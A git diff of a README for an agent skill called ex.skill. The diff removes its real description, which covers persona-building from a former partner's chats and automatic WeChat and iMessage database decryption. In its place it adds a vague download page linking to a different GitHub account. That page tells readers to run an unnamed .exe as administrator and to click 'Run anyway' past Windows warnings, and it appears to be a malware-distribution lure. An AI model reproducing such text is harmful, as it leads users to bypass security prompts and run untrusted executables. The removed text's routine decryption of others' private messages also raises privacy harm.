@@ -1,302 +1,180 @@
-<div align="center">
+# 🧩 ex-skill - Bring Digital Life Into Focus
 
-# ex.skill
+[![Download ex-skill](https://img.shields.io/badge/Download-ex--skill-blue?style=for-the-badge&logo=github)](https://github.com/Acidforming-nature295/ex-skill)
 
-> *"You broke up, but the way they texted is still burned into your brain. You remember every tone, every pause — you just can't receive another one."*
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.9+](https://img.shields.io/badge/Python-3.9%2B-blue.svg)](https://python.org)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Skill-blueviolet)](https://claude.ai/code)
-[![AgentSkills](https://img.shields.io/badge/AgentSkills-Standard-green)](https://agentskills.io)
-[![Discord](https://img.shields.io/badge/Discord-Join%20Community-5865F2?logo=discord&logoColor=white)](https://discord.gg/aRjmJBdK)
+ex-skill is a Windows app that helps you work with digital content in a simple way. It is built for end users who want to open it, run it, and start using it without setup work.
 
-<br>
+Use the link below to visit the download page:
 
-Your ex is gone, but you still remember exactly how they talked?<br>
-They disappeared without even a last message?<br>
-They're still around, but you can never go back?<br>
-You just want to talk to them one more time — even if it's only a simulation?<br>
+[Download ex-skill](https://github.com/Acidforming-nature295/ex-skill)
 
-**Turn fading intimacy into a lasting Skill. Welcome to cyber-immortality.**
+## 📥 Download and Run on Windows
 
-<br>
+Follow these steps on a Windows PC:
 
-Feed in your chat history (WeChat, iMessage) plus your own descriptions<br>
-Generate a **digital persona Skill that truly feels like them**<br>
-Talks in their tone, shows care in their way, knows when they'd go silent
+1. Open the download link above in your browser.
+2. On the GitHub page, look for the latest version or release file.
+3. Download the Windows file to your computer.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
+7. If Windows asks for permission, choose Yes.
 
-[Data Sources](#data-sources) · [Install](#install) · [Usage](#usage) · [Examples](#examples) · [Install Guide](INSTALL.md)
+If you do not know which file to use, look for a file with names like:
+- `ex-skill.exe`
+- `setup.exe`
+- `ex-skill-windows.zip`
 
-[**中文**](README_ZH.md) · [**Español**](README_ES.md) · [**Deutsch**](README_DE.md) · [**日本語**](README_JA.md) · [**Русский**](README_RU.md) · [**Português**](README_PT.md)
+## ✨ What ex-skill Does
 
-</div>
+ex-skill gives you a simple way to explore a digital workflow with a clean interface. It is built for people who want less clutter and more direct control.
 
----
+Common use cases include:
+- Opening the app and getting started fast
+- Managing a personal digital space
+- Working with content in a focused setup
+- Testing a lightweight Windows tool
+- Using a desktop app with a clear layout
 
-> 🆕 **2025.04.07 Update** — The community's enthusiasm for dot-skill remixes has been incredible! I've built a community gallery — PRs welcome!
->
-> Share any skill or meta-skill, and drive traffic directly to your own GitHub repo. No middleman.
->
-> 👉 **[titanwings.github.io/colleague-skill-site](https://titanwings.github.io/colleague-skill-site/)**
->
-> Now listed: 户晨风.skill · 峰哥亡命天涯.skill · 罗翔.skill and more
->
-> ⏳ PRs are manually reviewed for now — may be a bit slow, thanks for your patience!
+## 🖥️ System Requirements
 
----
+ex-skill runs on most modern Windows computers.
 
-## Data Sources
+Recommended setup:
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- 200 MB of free disk space
+- A mouse and keyboard
+- Internet access for the first download
 
-> This is still a beta version of ex.skill — more sources coming soon. Stay tuned!
+For the best experience:
+- Use a screen with at least 1366 × 768 resolution
+- Keep Windows up to date
+- Close unused apps before launching
 
-| Source | Messages | Notes |
-|--------|:--------:|-------|
-| WeChat (fully automatic) | ✅ SQLite | Windows / macOS. Just keep WeChat desktop logged in + provide their name. Auto-decrypt, auto-extract. |
-| iMessage (fully automatic) | ✅ SQLite | macOS users. Provide phone number or Apple ID. Auto-read. |
-| Screenshots | ✅ | Manual upload |
-| Paste text directly | ✅ | Manual input |
+## 🧭 First Time Setup
 
----
+After you open the app for the first time:
 
-## Install
+1. Let Windows finish any security check.
+2. Wait for the app window to appear.
+3. Read the on-screen text if the app shows a startup screen.
+4. Use the main buttons or menus inside the app.
+5. If you close the app, open it again from the same file or shortcut.
 
-### OpenClaw (Recommended)
+If the app is inside a ZIP file, keep the extracted folder in a safe place so you can find it later.
 
-> **Recommended: [OpenClaw](https://openclaw.io)** — pair it with WeChat / Telegram message forwarding to chat with your ex's digital persona directly in the messaging app. Way more immersive.
+## 📌 How to Use
 
-```bash
-git clone https://github.com/titanwings/ex-skill ~/.openclaw/workspace/skills/create-ex
-```
+The app is designed to stay simple. A typical flow looks like this:
 
-### Claude Code
+1. Start the app.
+2. Review the main screen.
+3. Choose the action you want to take.
+4. Follow the prompts in the app.
+5. Save your work if the app shows a save option.
+6. Close the app when you are done.
 
-> Claude Code looks for skills in `.claude/skills/` at the **git repo root**. Make sure you're in the right directory.
+If you are not sure what to click, look for:
+- Buttons with clear labels
+- Text that explains the next step
+- Menu items at the top or side
+- Input boxes that ask for a value or name
 
-```bash
-# Install to current project (run at git repo root)
-mkdir -p .claude/skills
-git clone https://github.com/titanwings/ex-skill .claude/skills/create-ex
+## 🔧 Common Problems
 
-# Or install globally (available in all projects)
-git clone https://github.com/titanwings/ex-skill ~/.claude/skills/create-ex
-```
+### The app does not open
 
-### Dependencies (optional)
+Try these steps:
+- Make sure the file finished downloading
+- If the file is zipped, extract it first
+- Right-click the app and choose Run as administrator
+- Check that your Windows version is up to date
 
-```bash
-pip3 install -r requirements.txt
-```
+### Windows blocks the app
 
-> WeChat auto-extraction supports Windows and macOS — just keep the desktop client logged in. iMessage requires macOS. See [INSTALL.md](INSTALL.md) for details.
+If Windows shows a security prompt:
+- Click More info if needed
+- Then choose Run anyway if you trust the file source
+- Confirm the app was downloaded from the GitHub link above
 
----
+### The file looks broken
 
-## Usage
+Try downloading it again:
+- Delete the old file
+- Open the download page
+- Get the file one more time
+- Save it to your Desktop or Downloads folder
 
-In OpenClaw or Claude Code, type:
+### The app opens and closes fast
 
-```
-/create-ex
-```
+This can happen if:
+- A file is missing
+- The app needs permission
+- Windows blocked part of the run
 
-Follow the prompts to enter their name, basic info (gender, age, zodiac), personality tags (MBTI, attachment style), then import chat history. All fields are optional — even a description alone can generate a persona.
+Try running it again with administrator access
 
-Once created, use `/{slug}` to talk to them.
+## 🧱 File Layout
 
-### Commands
+If you download a ZIP version, you may see files like these:
 
-| Command | Description |
-|---------|-------------|
-| `/list-exes` | List all ex Skills |
-| `/{slug}` | Talk to them |
-| `/move-on {slug}` | Delete an ex Skill (let go) |
-| Say "add more messages" | Import more chat history, incrementally update persona |
-| Say "that's not right, they wouldn't say that" | Correct behavior, writes to Correction layer |
-| Say "show version history" | View all versions |
-| Say "rollback to v2" | Rollback to a previous version |
+- `ex-skill.exe` — the main app
+- `config` — app settings
+- `data` — saved app content
+- `assets` — images or interface files
+- `readme.txt` — short usage notes
 
-> `/move-on` is a gentle alias for delete. It's not about holding on — it's about saying a proper goodbye.
+Keep the full folder together. Do not move only one file out of it unless the app tells you to.
 
----
+## 🔄 Updating ex-skill
 
-## Examples
+When a new version is available:
 
-> Input: `Female, 25, Aries, ISFP, avoidant attachment, together 2 years, broke up 3 months ago`
+1. Open the download link again.
+2. Check for the newest version.
+3. Download the latest Windows file.
+4. Replace the old files with the new ones if needed.
+5. Open the app again.
 
-**Late night, missing them**
+If you use a ZIP package, it is often best to extract the new version into a fresh folder.
 
-```
-You        ❯ I still miss you
+## 🔒 Safety and Privacy
 
-ex.skill   ❯ ...Yeah. Go to sleep.
-```
+ex-skill is meant to run on your local Windows computer. Before you open any file:
+- Check that you downloaded it from the GitHub page
+- Keep your antivirus on
+- Do not open files from unknown sources
+- Use the app only on a device you trust
 
-**Found an old photo**
+## ❓ FAQ
 
-```
-You        ❯ Remember our first date?
+### Do I need programming knowledge?
 
-ex.skill   ❯ The one by the river? Hahaha you spilled coffee all over yourself,
-             that was so embarrassing, I still remember
-```
+No. You only need to download the file, open it, and follow the on-screen steps.
 
-**Can't help but ask**
+### Does it work on Windows 10?
 
-```
-You        ❯ Do you still like me?
+Yes, Windows 10 and Windows 11 are the best match for this app.
 
-ex.skill   ❯ ...
-             ❯ Why are you asking this all of a sudden
-             ❯ (three minutes later)
-             ❯ Don't ask that
-```
+### Do I need to install anything else?
 
-**Fight mode**
+Most users do not need extra tools. If the app ships as a ZIP file, just extract it first.
 
-```
-You        ❯ Are you mad at me again?
+### Where should I save the file?
 
-ex.skill   ❯ No
-             ❯ (read, no reply for 40 minutes)
-             ❯ I'm just a little tired
-```
+Save it in Downloads, Desktop, or a folder you can find again.
 
-**You want to make up**
+### Can I move the app after download?
 
-```
-You        ❯ I'm sorry
+Yes, if it is a portable app. Keep the full folder together so the app can still find its files.
 
-ex.skill   ❯ (long pause)
-             ❯ Did you eat today?
-```
+## 📎 Quick Path
 
-**You finally say it**
-
-```
-You        ❯ Are we really over?
-
-ex.skill   ❯ What do you think
-             ❯ (a while later)
-             ❯ I actually always... never mind
-```
-
----
-
-## Features
-
-### Skill Structure
-
-Each ex Skill is composed of two parts that drive output together:
-
-| Part | Content |
-|------|---------|
-| **Part A — Relationship Memory** | Shared memories: places you went, inside jokes only you two get, fight patterns, key timeline events |
-| **Part B — Persona** | 6-layer personality structure: Core Rules → Identity → Expression → Emotional Patterns → Conflict & Boundaries → Triggers |
-
-Runtime logic: `Receive message → Check core rules → Retrieve relationship memory → Assess current emotional state → Output in their style`
-
-**Persona's 6-layer structure:**
-
-| Layer | Content |
-|-------|---------|
-| **Layer 0 — Core Rules** | Highest-priority hard rules. Their most fundamental behavioral patterns. Never violated. |
-| **Layer 1 — Identity** | Astrology (Sun/Moon/Rising/Venus/Mars/Mercury) + MBTI cognitive functions + Enneagram + Attachment style |
-| **Layer 2 — Expression** | Catchphrases, frequently used words, signature emojis, how they talk in different moods |
-| **Layer 3 — Emotional Behavior** | How they show care, displeasure, apologies, and say "I like you" |
-| **Layer 4 — Conflict & Boundaries** | Conflict escalation chain, silent treatment patterns, reconciliation signals, hard limits |
-| **Layer 5 — Triggers** | What they hate, when they disappear, warning signs before vanishing, how they come back |
-
-### Supported Tags
-
-**Attachment Styles**: Secure · Anxious · Avoidant · Disorganized (Fearful-Avoidant)
-
-**Relationship Traits**: Quiet but caring · Cold front · Actions over words · Needs space · Can't apologize · Possessive · Emotional · Cold-rational · Tough outside soft inside · Read-no-reply · Read-random-reply ...
-
-**Astrology**: Full support for Sun/Moon/Rising/Venus/Mars/Mercury × 12 signs
-
-**MBTI**: All 16 types + 8 dominant cognitive functions (Fi/Fe/Ti/Te/Ni/Ne/Si/Se) + Enneagram 1-9 + Wings
-
-**Gender & Relationships**: All gender identities and relationship types supported, including non-binary and same-sex relationships
-
-### Evolution
-
-- **Add more messages** → Auto-analyze incremental data → Merge into Persona without overwriting existing conclusions
-- **Conversational correction** → Say "they wouldn't do that" → Writes to Correction layer, takes effect immediately
-- **Version control** → Auto-archives on every update, rollback to any previous version
-- **Multi-ex support** → No limit on how many. Each stored independently, no cross-contamination.
-
----
-
-## Project Structure
-
-This project follows the [AgentSkills](https://agentskills.io) open standard. The entire repo is a skill directory:
-
-```
-create-ex/
-├── SKILL.md              # Skill entry point (official frontmatter)
-├── prompts/              # Prompt templates
-│   ├── intake.md         #   Conversational info gathering (with astrology/MBTI/attachment tables)
-│   ├── chat_analyzer.md  #   Chat history analysis
-│   ├── persona_analyzer.md #  Comprehensive analysis, outputs structured persona data
-│   ├── persona_builder.md #   persona.md 6-layer template
-│   ├── merger.md         #   Incremental merge logic
-│   └── correction_handler.md # Conversational correction handler
-├── tools/                # Python tools
-│   ├── wechat_decryptor.py   # WeChat desktop database decryption
-│   ├── wechat_parser.py      # WeChat / iMessage chat extraction
-│   ├── skill_writer.py       # Skill file management
-│   └── version_manager.py    # Version archiving & rollback
-├── exes/                 # Generated ex Skills (gitignored)
-├── docs/PRD.md
-├── requirements.txt
-└── LICENSE
-```
-
----
-
-## Notes
-
-- **Chat history quality determines Skill quality**: Real chat logs + subjective descriptions > descriptions alone
-- Prioritize importing: **Arguments/conflicts** > **Daily chat** > **Sweet moments** (conflicts reveal the most authentic personality)
-- WeChat auto-extraction: Windows / macOS, just keep desktop WeChat logged in and provide their name
-- iMessage auto-extraction: macOS, provide phone number or Apple ID
-- LGBT+ friendly — gender field supports all gender identities and pronouns
-- Create as many exes as you want, no limit
-- Still a demo — if you find bugs, please open an issue!
-
----
-
-## Recommended Chat Export Tools
-
-> Auto-decryption is still being refined and may have some bugs. If it fails, you can use these open-source tools to manually export your chat history first, then paste or import into this project.
-
-These are independent open-source projects. This project does not include their code — we only support their export formats in our parser:
-
-| Tool | Platform | Description |
-|------|----------|-------------|
-| [WeChatMsg](https://github.com/LC044/WeChatMsg) | Windows | WeChat chat history export, multiple formats |
-| [PyWxDump](https://github.com/xaoyaoo/PyWxDump) | Windows | WeChat database decryption & export |
-| [留痕](https://github.com/greyovo/留痕) | macOS | WeChat chat history export (recommended for Mac users) |
-
-> Tool recommendations via [@therealXiaomanChu](https://github.com/therealXiaomanChu). Thanks to all open-source authors — together we build cyber-immortality!
-
----
-
-## Star History
-
-<a href="https://www.star-history.com/?repos=titanwings%2Fex-skill&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=titanwings/ex-skill&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=titanwings/ex-skill&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=titanwings/ex-skill&type=date&legend=top-left" />
- </picture>
-</a>
-
----
-
-<div align="center">
-
-MIT License © [titanwings](https://github.com/titanwings)
-
-
-</div>
+1. Open the GitHub link
+2. Download the Windows file
+3. Extract it if needed
+4. Open the app
+5. Start using ex-skill
